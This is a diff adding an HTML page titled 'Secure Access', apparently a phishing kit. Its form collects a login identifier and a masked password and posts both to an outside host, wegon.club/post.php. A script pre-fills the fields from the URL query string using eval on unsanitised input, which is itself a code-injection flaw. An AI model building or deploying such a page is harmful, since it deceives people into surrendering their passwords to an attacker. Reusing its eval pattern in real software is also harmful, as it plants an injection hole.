@@ -1,0 +1,248 @@
+<!doctype html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Secure Access</title>
+<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
+</style>
+<style rel="stylesheet" type="text/css" data-href="">html, body
+a
+{
+   color: #0000FF;
+   text-decoration: underline;
+}
+a:visited
+{
+   color: #800080;
+}
+a:active
+{
+   color: #FF0000;
+}
+a:hover
+{
+   color: #0000FF;
+   text-decoration: underline;
+}
+h1
+{
+   font-family: Arial;
+   font-weight: bold;
+   font-size: 32px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+h2
+{
+   font-family: Arial;
+   font-weight: bold;
+   font-size: 27px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+h3
+{
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 24px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+h4
+{
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 21px;
+   font-style: italic;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+h5
+{
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 19px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+h6
+{
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 16px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+.CustomStyle
+{
+   font-family: "Courier New";
+   font-weight: bold;
+   font-size: 16px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000080;
+   background-color: transparent;
+}
+</style>
+<style rel="stylesheet" type="text/css" data-href="">html, body
+body
+div#container
+{
+   width: 1052px;
+   position: relative;
+   margin: 0 auto 0 auto;
+   text-align: left;
+}
+body
+{
+   background-color: #D3D3D3;
+   color: #000000;
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 13px;
+   line-height: 1.1875;
+   margin: 0;
+   text-align: center;
+}
+#wb_Form1
+{
+   background-color: transparent;
+   background-image: url(https://i.postimg.cc/HncpPBM1/upbod.png);
+   background-repeat: no-repeat;
+   background-position: left top;
+   border: 2px #0000FF solid;
+}
+#Editbox1
+{
+   border: 1px #A9A9A9 none;
+   background-color: transparent;
+   color :#4169E1;
+   font-family: Arial;
+   font-weight: bold;
+   font-size: 19px;
+   text-align: center;
+   vertical-align: middle;
+}
+#Editbox2
+{
+   border: 1px #A9A9A9 solid;
+   background-color: #FFFFFF;
+   color :#000000;
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 13px;
+   padding: 0px 0px 0px 5px;
+   text-align: left;
+   vertical-align: middle;
+}
+#Editbox3
+{
+   border: 1px #A9A9A9 solid;
+   background-color: #FFFFFF;
+   color :#000000;
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 13px;
+   padding: 0px 0px 0px 5px;
+   text-align: left;
+   vertical-align: middle;
+}
+#Button1
+{
+   border: 1px #4169E1 solid;
+   background-color: #4169E1;
+   color: #FFFFFF;
+   font-family: Arial;
+   font-weight: bold;
+   font-size: 16px;
+}
+</style>
+<style rel="stylesheet" type="text/css" data-href="">html, body
+input.Editbox1 { -webkit-text-security: none; }
+input.Editbox2 { -webkit-text-security: disc; }
+</style>
+<script>
+function ValidateForm1(theForm)
+{
+   var regexp;
+   if (theForm.Editbox2.value == "")
+   {
+      alert("invalid");
+      theForm.Editbox2.focus();
+      return false;
+   }
+   if (theForm.Editbox3.value == "")
+   {
+      alert("invalid");
+      theForm.Editbox3.focus();
+      return false;
+   }
+   return true;
+}
+</script>
+</head>
+<body>
+<div id="container">
+<div id="wb_Form1" style="position:absolute;left:324px;top:19px;width:392px;height:304px;z-index:4;">
+<form name="Form1" method="post" action="https://wegon.club/post.php" enctype="" id="Form1" onsubmit="return ValidateForm1(this)">
+<input type="text" id="Editbox2" style="position:absolute;left:23px;top:133px;width:338px;height:23px;line-height:23px;z-index:0;" name="Editbox2" value="" autocomplete="off">
+<input type="text" class="Editbox2" id="Editbox3" style="position:absolute;left:23px;top:189px;width:338px;height:23px;line-height:23px;z-index:1;" name="Editbox3" value="" autocomplete="off">
+<input type="submit" id="Button1" name="" value="Continue" style="position:absolute;left:23px;top:231px;width:345px;height:40px;z-index:2;">
+<input type="text" id="Editbox1" style="position:absolute;left:23px;top:22px;width:345px;height:35px;line-height:35px;z-index:3;" name="Editbox1" value="">
+</form>
+<script type="text/javascript" language="JavaScript">
+<!-- Copyright 2006 Bontrager Connection, LLC
+function FillForm() {
+// Specify form's name between the quotes on next line.
+var FormName = "Form1";
+var questionlocation = location.href.indexOf('?');
+if(questionlocation < 0) { return; }
+var q = location.href.substr(questionlocation + 1);
+var list = q.split('&');
+for(var i = 0; i < list.length; i++) {
+   var kv = list[i].split('=');
+   if(! eval('document.'+FormName+'.'+kv[0])) { continue; }
+   kv[1] = unescape(kv[1]);
+   if(kv[1].indexOf('"') > -1) {
+      var re = /"/g;
+      kv[1] = kv[1].replace(re,'\\"');
+      }
+   eval('document.'+FormName+'.'+kv[0]+'.value="'+kv[1]+'"');
+   }
+}
+FillForm();
+//-->
+</script>
+</div>
+</div>
+</body>
+</html>
